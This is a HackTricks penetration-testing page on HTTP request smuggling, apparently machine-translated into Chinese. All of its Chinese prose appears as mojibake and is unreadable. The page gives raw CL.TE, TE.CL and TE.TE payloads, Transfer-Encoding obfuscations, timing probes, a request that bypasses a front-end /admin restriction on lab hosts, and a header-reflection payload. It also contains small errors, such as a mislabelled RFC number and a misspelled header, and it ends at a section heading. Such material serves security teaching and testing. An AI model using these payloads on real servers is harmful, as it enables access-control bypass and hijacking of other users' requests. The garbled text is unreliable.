# HTTPè¯·æ±‚åŠ«æŒ/HTTPè§£åŒæ­¥æ”»å‡»

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä»€ä¹ˆæ˜¯

å½“**å‰ç«¯ä»£ç†**å’Œ**åç«¯**æœåŠ¡å™¨ä¹‹é—´å‘ç”Ÿ**ä¸åŒæ­¥**æ—¶ï¼Œå°±ä¼šå‡ºç°æ­¤æ¼æ´ï¼Œè¿™ä½¿å¾—**æ”»å‡»è€…**èƒ½å¤Ÿå‘é€ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†è¢«**å‰ç«¯ä»£ç†**ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰**è§£é‡Šä¸ºå•ä¸ªè¯·æ±‚**ï¼Œè€Œè¢«**åç«¯**æœåŠ¡å™¨**è§£é‡Šä¸º2ä¸ªè¯·æ±‚**ã€‚\
è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿåœ¨åˆ°è¾¾åç«¯æœåŠ¡å™¨ä¹‹å**ä¿®æ”¹ä¸‹ä¸€ä¸ªè¯·æ±‚**ã€‚

### ç†è®º

[**RFCè§„èŒƒï¼ˆ2161ï¼‰**](https://tools.ietf.org/html/rfc2616)

> å¦‚æœæ¥æ”¶åˆ°çš„æ¶ˆæ¯åŒæ—¶å…·æœ‰Transfer-Encodingå¤´å­—æ®µå’ŒContent-Lengthå¤´å­—æ®µï¼Œåˆ™å¿…é¡»å¿½ç•¥åè€…ã€‚

**Content-Length**

> Content-Lengthå®ä½“å¤´å­—æ®µæŒ‡ç¤ºå‘é€ç»™æ¥æ”¶è€…çš„å®ä½“ä¸»ä½“çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚

**Transfer-Encoding: chunked**

> Transfer-Encodingå¤´å­—æ®µæŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè´Ÿè½½ä¸»ä½“çš„ç¼–ç å½¢å¼ã€‚\
> Chunkedè¡¨ç¤ºå¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€

### ç°å®æƒ…å†µ

**å‰ç«¯**ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰**å¤„ç†**_**content-length**_æˆ–_**transfer-encoding**_å¤´å­—æ®µï¼Œè€Œ**åç«¯**æœåŠ¡å™¨**å¤„ç†å¦ä¸€ä¸ª**å¤´å­—æ®µï¼Œä»è€Œå¯¼è‡´ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„**ä¸åŒæ­¥**ã€‚\
è¿™å¯èƒ½éå¸¸å±é™©ï¼Œå› ä¸º**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘åå‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚**ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨å°†**è§£é‡Š****æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚**ï¼Œå°±å¥½åƒå®ƒ**æ¥è‡ªä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯**ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„**çœŸå®è¯·æ±‚**å°†æˆä¸º**æ³¨å…¥è¯·æ±‚**çš„ä¸€éƒ¨åˆ†ã€‚

### ç‰¹æ®Šæƒ…å†µ

è¯·è®°ä½ï¼Œåœ¨HTTPä¸­ï¼Œ**æ¢è¡Œç¬¦ç”±2ä¸ªå­—èŠ‚ç»„æˆ**ï¼š

* **Content-Length**ï¼šæ­¤å¤´å­—æ®µä½¿ç”¨**åè¿›åˆ¶æ•°**æ¥æŒ‡ç¤ºè¯·æ±‚çš„**ä¸»ä½“**çš„**å­—èŠ‚æ•°**ã€‚ä¸»ä½“é¢„è®¡ä»¥æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ**ä¸éœ€è¦åœ¨è¯·æ±‚çš„æœ«å°¾æ·»åŠ æ¢è¡Œç¬¦**ã€‚
* **Transfer-Encodingï¼š**æ­¤å¤´å­—æ®µåœ¨**ä¸»ä½“**ä¸­ä½¿ç”¨**åå…­è¿›åˆ¶æ•°**æ¥æŒ‡ç¤º**ä¸‹ä¸€ä¸ªå—**çš„**å­—èŠ‚æ•°**ã€‚**å—**å¿…é¡»ä»¥**æ¢è¡Œç¬¦**ç»“å°¾ï¼Œä½†æ˜¯è¿™ä¸ªæ¢è¡Œç¬¦**ä¸è®¡å…¥**é•¿åº¦æŒ‡ç¤ºå™¨ã€‚æ­¤ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥**å¤§å°ä¸º0çš„å—åè·Ÿ2ä¸ªæ¢è¡Œç¬¦**ç»“æŸï¼š`0`
* **Connection**ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚åŠ«æŒçš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨**`Connection: keep-alive`**ã€‚

## åŸºæœ¬ç¤ºä¾‹

å› æ­¤ï¼Œè¯·æ±‚åŠ«æŒæ”»å‡»æ¶‰åŠå°†`Content-Length`å¤´å­—æ®µå’Œ`Transfer-Encoding`å¤´å­—æ®µæ”¾å…¥å•ä¸ªHTTPè¯·æ±‚ä¸­ï¼Œå¹¶æ“çºµè¿™äº›å­—æ®µï¼Œä»¥ä½¿å‰ç«¯å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚å…·ä½“çš„æ“ä½œæ–¹å¼å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š

* **CL.TE**ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´å­—æ®µï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´å­—æ®µã€‚
* **TE.CL**ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´å­—æ®µï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´å­—æ®µã€‚
* **TE.TE**ï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ`Transfer-Encoding`å¤´å­—æ®µï¼Œä½†å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†å¤´å­—æ®µæ¥è¯±ä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚

### CL.TEæ¼æ´

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**å‰ç«¯**æœåŠ¡å™¨ä½¿ç”¨**`Content-Length`**å¤´å­—æ®µï¼Œ**åç«¯**æœåŠ¡å™¨ä½¿ç”¨**`Transfer-Encoding`**å¤´å­—æ®µã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œç®€å•çš„HTTPè¯·æ±‚åŠ«æŒæ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

è¯·æ³¨æ„ï¼Œ`Content-Length`æŒ‡ç¤º**è¯·æ±‚ä¸»ä½“çš„é•¿åº¦ä¸º30ä¸ªå­—èŠ‚**ï¼ˆ_è¯·è®°ä½ï¼ŒHTTPä½¿ç”¨æ¢è¡Œç¬¦ï¼Œå› æ­¤æ¯ä¸ªæ¢è¡Œç¬¦å 2ä¸ªå­—èŠ‚_ï¼‰ï¼Œå› æ­¤åå‘ä»£ç†**å°†å®Œæ•´çš„è¯·æ±‚å‘é€**åˆ°åç«¯ï¼Œå¹¶ä¸”åç«¯å°†å¤„ç†`Transfer-Encoding`å¤´å­—æ®µï¼Œå°†`GET /404 HTTP/1.1`ä½œä¸º**ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å¤´**ï¼ˆé¡ºä¾¿è¯´ä¸€å¥ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†é™„åŠ åˆ°`Foo:x<ä¸‹ä¸€ä¸ªè¯·æ±‚ä»è¿™é‡Œå¼€å§‹>`ï¼‰ã€‚
### TE.CLæ¼æ´

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹ç®€å•çš„HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**åå‘ä»£ç†**å°†æ ¹æ®`Transfer-encoding`çš„æŒ‡ç¤ºå°†**æ•´ä¸ªè¯·æ±‚**å‘é€åˆ°**åç«¯**ã€‚ä½†æ˜¯ï¼Œ**åç«¯**åªä¼šå¤„ç†`Content-Lenght`ä¸­æŒ‡å®šçš„`7b`ï¼ˆ4å­—èŠ‚ï¼‰ã€‚å› æ­¤ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†æ˜¯ä»¥`GET /404 HTTP/1.1`å¼€å¤´çš„è¯·æ±‚ã€‚

_è¯·æ³¨æ„ï¼Œå³ä½¿æ”»å‡»å¿…é¡»ä»¥`0`ç»“æŸï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚ä¹Ÿå°†ä½œä¸º**x**å‚æ•°çš„é¢å¤–å€¼é™„åŠ ã€‚_\
_è¿˜è¯·æ³¨æ„ï¼ŒåµŒå…¥è¯·æ±‚çš„Content-Lengthå°†æŒ‡ç¤ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„é•¿åº¦ï¼Œè¯¥è¯·æ±‚å°†é™„åŠ åˆ°**x**å‚æ•°ä¸Šã€‚å¦‚æœå¤ªå°ï¼Œåªä¼šé™„åŠ å‡ ä¸ªå­—èŠ‚ï¼Œå¦‚æœå¤ªå¤§ï¼ˆå¤§äºä¸‹ä¸€ä¸ªè¯·æ±‚çš„é•¿åº¦ï¼‰ï¼Œåˆ™ä¼šä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚æŠ›å‡ºé”™è¯¯ã€‚_

### TE.TEæ¼æ´

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ`Transfer-Encoding`å¤´ï¼Œä½†å¯ä»¥é€šè¿‡æŸç§æ–¹å¼ä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒæ¥æ··æ·†å¤´éƒ¨ã€‚\
æœ‰æ— æ•°ç§æ··æ·†`Transfer-Encoding`å¤´çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

æ ¹æ®åœæ­¢å¤„ç†TEå¤´çš„æœåŠ¡å™¨ï¼ˆåå‘ä»£ç†æˆ–åç«¯ï¼‰ï¼Œæ‚¨å°†æ‰¾åˆ°**CL.TEæ¼æ´**æˆ–**TE.CLæ¼æ´**ã€‚

## æŸ¥æ‰¾HTTPè¯·æ±‚æ¬ºéª—

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾CL.TEæ¼æ´

å¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°CL.TEå˜ä½“çš„è¯·æ±‚æ¬ºéª—æ”»å‡»ï¼Œé‚£ä¹ˆå‘é€ä»¥ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´å»¶è¿Ÿï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ï¼Œå®ƒåªä¼šè½¬å‘è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥äº†`0`ã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œç„¶åç­‰å¾…ä¸‹ä¸€ä¸ªå—åˆ°è¾¾ã€‚è¿™å°†å¯¼è‡´å¯è§‚å¯Ÿåˆ°çš„æ—¶é—´å»¶è¿Ÿã€‚

æœ‰æ—¶ï¼Œæ‚¨åœ¨æœ€ç»ˆä¸»æœºä¸Šæ”¶åˆ°400é”™è¯¯è¯·æ±‚ï¼Œè€Œä¸æ˜¯è¶…æ—¶ï¼Œå°±åƒåœ¨ä»¥ä¸‹åœºæ™¯ä¸­å‘é€CL.TEæœ‰æ•ˆè´Ÿè½½ä¸€æ ·ï¼š

![](<../../.gitbook/assets/image (444).png>)

å“åº”æ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œå…¶ä¸­åŒ…å«é”™è¯¯ä¿¡æ¯ï¼Œç”šè‡³åŒ…å«haproxyçš„ç‰ˆæœ¬ï¼š

![](<../../.gitbook/assets/image (443).png>)

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾TE.CLæ¼æ´

å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°TE.CLè¯·æ±‚æ··æ·†çš„æ”»å‡»ï¼Œé‚£ä¹ˆå‘é€å¦‚ä¸‹çš„è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨äº†`Transfer-Encoding`å¤´ï¼Œå®ƒåªä¼šè½¬å‘è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥äº†`X`ã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ï¼ŒæœŸæœ›åœ¨æ¶ˆæ¯ä½“ä¸­æ¥æ”¶æ›´å¤šå†…å®¹ï¼Œå¹¶ç­‰å¾…å‰©ä½™å†…å®¹åˆ°è¾¾ã€‚è¿™å°†å¯¼è‡´å¯è§‚å¯Ÿåˆ°çš„æ—¶é—´å»¶è¿Ÿã€‚

### æ¢æµ‹HTTPè¯·æ±‚èµ°ç§æ¼æ´

ä¸€æ—¦æ‚¨å‘ç°**æ—¶åºæŠ€æœ¯æœ‰æ•ˆ**ï¼Œæ‚¨éœ€è¦**æ¢æµ‹**æ‚¨æ˜¯å¦å¯ä»¥**ä¿®æ”¹å…¶ä»–å®¢æˆ·ç«¯è¯·æ±‚**ã€‚\
æœ€ç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ±¡æŸ“è‡ªå·±çš„è¯·æ±‚ï¼Œä¾‹å¦‚å‘å‡ºå¯¹`/`çš„è¯·æ±‚è¿”å›404ã€‚\
åœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•ä½¿ç”¨`CL.TE`å’Œ`TE.CL`ç¤ºä¾‹æ¥æ±¡æŸ“å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè¦æ±‚è¯·æ±‚`/404`ï¼Œä»è€Œåœ¨å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•å…¶ä»–èµ„æºæ—¶å¼•å‘404å“åº”ã€‚

**æ³¨æ„äº‹é¡¹**

åœ¨å°è¯•é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æ¥ç¡®è®¤è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œåº”ç‰¢è®°ä»¥ä¸‹é‡è¦è€ƒè™‘å› ç´ ï¼š

* "æ”»å‡»"è¯·æ±‚å’Œ"æ­£å¸¸"è¯·æ±‚åº”ä½¿ç”¨ä¸åŒçš„ç½‘ç»œè¿æ¥å‘é€åˆ°æœåŠ¡å™¨ã€‚é€šè¿‡åŒä¸€è¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚æ— æ³•è¯æ˜æ¼æ´çš„å­˜åœ¨ã€‚
* "æ”»å‡»"è¯·æ±‚å’Œ"æ­£å¸¸"è¯·æ±‚åº”å°½å¯èƒ½ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°åç§°ã€‚è¿™æ˜¯å› ä¸ºè®¸å¤šç°ä»£åº”ç”¨ç¨‹åºæ ¹æ®URLå’Œå‚æ•°å°†å‰ç«¯è¯·æ±‚è·¯ç”±åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°å¢åŠ äº†è¯·æ±‚å°†ç”±åŒä¸€åç«¯æœåŠ¡å™¨å¤„ç†çš„æœºä¼šï¼Œè¿™å¯¹äºæ”»å‡»æ˜¯å¿…ä¸å¯å°‘çš„ã€‚
* åœ¨æµ‹è¯•"æ­£å¸¸"è¯·æ±‚ä»¥æ£€æµ‹æ¥è‡ª"æ”»å‡»"è¯·æ±‚çš„ä»»ä½•å¹²æ‰°æ—¶ï¼Œæ‚¨ä¸åº”ç”¨ç¨‹åºåŒæ—¶æ¥æ”¶çš„ä»»ä½•å…¶ä»–è¯·æ±‚ï¼ˆåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ï¼‰ç«äº‰ã€‚æ‚¨åº”è¯¥åœ¨"æ”»å‡»"è¯·æ±‚ä¹‹åç«‹å³å‘é€"æ­£å¸¸"è¯·æ±‚ã€‚å¦‚æœåº”ç”¨ç¨‹åºå¾ˆå¿™ï¼Œæ‚¨å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ä»¥ç¡®è®¤æ¼æ´ã€‚
* åœ¨æŸäº›åº”ç”¨ç¨‹åºä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨å……å½“è´Ÿè½½å‡è¡¡å™¨ï¼Œå¹¶æ ¹æ®æŸäº›è´Ÿè½½å‡è¡¡ç®—æ³•å°†è¯·æ±‚è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœæ‚¨çš„"æ”»å‡»"å’Œ"æ­£å¸¸"è¯·æ±‚è¢«è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿï¼Œåˆ™æ”»å‡»å°†å¤±è´¥ã€‚è¿™æ˜¯æ‚¨å¯èƒ½éœ€è¦å°è¯•å¤šæ¬¡æ‰èƒ½ç¡®è®¤æ¼æ´çš„å¦ä¸€ä¸ªåŸå› ã€‚
* å¦‚æœæ‚¨çš„æ”»å‡»æˆåŠŸå¹²æ‰°äº†åç»­è¯·æ±‚ï¼Œä½†è¿™ä¸æ˜¯æ‚¨å‘é€çš„"æ­£å¸¸"è¯·æ±‚ä»¥æ£€æµ‹å¹²æ‰°çš„è¯·æ±‚ï¼Œåˆ™æ„å‘³ç€å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·å—åˆ°äº†æ‚¨çš„æ”»å‡»çš„å½±å“ã€‚å¦‚æœæ‚¨ç»§ç»­æ‰§è¡Œæµ‹è¯•ï¼Œè¿™å¯èƒ½ä¼šå¯¹å…¶ä»–ç”¨æˆ·äº§ç”Ÿç ´åæ€§å½±å“ï¼Œå› æ­¤æ‚¨åº”è¯¥è°¨æ…è¡Œäº‹ã€‚

### é€šè¿‡é€è·³å¤´å¼ºåˆ¶

é€šè¿‡æ»¥ç”¨é€è·³å¤´ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤ºä»£ç†**åˆ é™¤Content-Lengthæˆ–Transfer-Encodingå¤´ï¼Œä»¥ä¾¿æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§**ã€‚
```
Connection: Content-Lentgh
```
æœ‰å…³è·³è·ƒå¼å¤´éƒ¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## æ»¥ç”¨HTTPè¯·æ±‚åŠ«æŒ

### ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶

æœ‰æ—¶**å‰ç«¯ä»£ç†ä¼šæ‰§è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥**ã€‚æ‚¨å¯ä»¥é€šè¿‡æ»¥ç”¨HTTPè¯·æ±‚åŠ«æŒæ¥é¿å¼€è¿™äº›æ£€æŸ¥ï¼Œå› ä¸ºæ‚¨å°†èƒ½å¤Ÿ**ç»•è¿‡ä¿æŠ¤æªæ–½**ã€‚ä¾‹å¦‚ï¼Œåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨**æ— æ³•ä»å¤–éƒ¨è®¿é—®`/admin`**ï¼Œè€Œå‰ç«¯ä»£ç†æ­£åœ¨æ£€æŸ¥ï¼Œä½†æ˜¯è¿™ä¸ª**ä»£ç†æ²¡æœ‰æ£€æŸ¥åµŒå…¥çš„è¯·æ±‚**ï¼š

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### æ­ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

åœ¨è®¸å¤šåº”ç”¨ç¨‹åºä¸­ï¼Œ**å‰ç«¯æœåŠ¡å™¨åœ¨å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ä¹‹å‰ä¼šå¯¹å…¶è¿›è¡Œä¸€äº›é‡å†™**ï¼Œé€šå¸¸æ˜¯é€šè¿‡æ·»åŠ ä¸€äº›é¢å¤–çš„è¯·æ±‚å¤´æ¥å®ç°ã€‚\
å¸¸è§çš„åšæ³•æ˜¯åœ¨è¯·æ±‚ä¸­**æ·»åŠ å¤´éƒ¨**`X-Forwarded-For: <å®¢æˆ·ç«¯çš„IP>`æˆ–ç±»ä¼¼çš„å¤´éƒ¨ï¼Œä»¥ä¾¿åç«¯çŸ¥é“å®¢æˆ·ç«¯çš„IPã€‚\
æœ‰æ—¶ï¼Œå¦‚æœæ‚¨å¯ä»¥**æ‰¾åˆ°é™„åŠ åˆ°è¯·æ±‚çš„æ–°å€¼**ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿ**ç»•è¿‡ä¿æŠ¤æªæ–½**å¹¶**è®¿é—®éšè—çš„ä¿¡æ¯**/**ç«¯ç‚¹**ã€‚

è¦å‘ç°ä»£ç†å¦‚ä½•é‡å†™è¯·æ±‚ï¼Œæ‚¨éœ€è¦**æ‰¾åˆ°ä¸€ä¸ªåç«¯å°†åœ¨å“åº”ä¸­åæ˜ å…¶å€¼çš„POSTå‚æ•°**ã€‚ç„¶åï¼Œå°†æ­¤å‚æ•°æ”¾åœ¨æœ€åï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹æ¼æ´åˆ©ç”¨ä¹‹ä¸€ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†é™„åŠ åœ¨`search=`ä¹‹åï¼Œè¿™ä¹Ÿæ˜¯**å…¶å€¼å°†åœ¨å“åº”ä¸­åæ˜ **çš„å‚æ•°ï¼Œå› æ­¤å®ƒå°†**åæ˜ ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¤´éƒ¨**ã€‚

è¯·æ³¨æ„ï¼Œ**åªæœ‰åµŒå…¥è¯·æ±‚çš„`Content-Length`å¤´éƒ¨ä¸­æŒ‡ç¤ºçš„é•¿åº¦å°†è¢«åæ˜ **ã€‚å¦‚æœä½¿ç”¨è¾ƒå°çš„æ•°å­—ï¼Œåªä¼šåæ˜ å‡ ä¸ªå­—èŠ‚ï¼Œå¦‚æœä½¿ç”¨æ¯”æ‰€æœ‰å¤´éƒ¨çš„é•¿åº¦æ›´å¤§çš„æ•°å­—ï¼Œåˆ™åµŒå…¥è¯·æ±‚å°†å¼•å‘é”™è¯¯ã€‚å› æ­¤ï¼Œæ‚¨åº”è¯¥**ä»ä¸€ä¸ªè¾ƒå°çš„æ•°å­—å¼€å§‹**ï¼Œç„¶å**é€æ¸å¢åŠ **ï¼Œç›´åˆ°çœ‹åˆ°æ‚¨æƒ³è¦çœ‹åˆ°çš„æ‰€æœ‰å†…å®¹ã€‚\
è¿˜è¦æ³¨æ„ï¼Œè¿™ç§æŠ€æœ¯ä¹Ÿå¯ä»¥åˆ©ç”¨TE.CLæ¼æ´ï¼Œä½†è¯·æ±‚å¿…é¡»ä»¥`search=\r\n0`ç»“å°¾ã€‚ç„¶è€Œï¼Œæ— è®ºæ¢è¡Œç¬¦æ˜¯ä»€ä¹ˆï¼Œå€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚

æœ€åè¯·æ³¨æ„ï¼Œåœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬ä»ç„¶åœ¨æ”»å‡»è‡ªå·±ä»¥äº†è§£å‰ç«¯ä»£ç†å¦‚ä½•é‡å†™è¯·æ±‚ã€‚

### æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

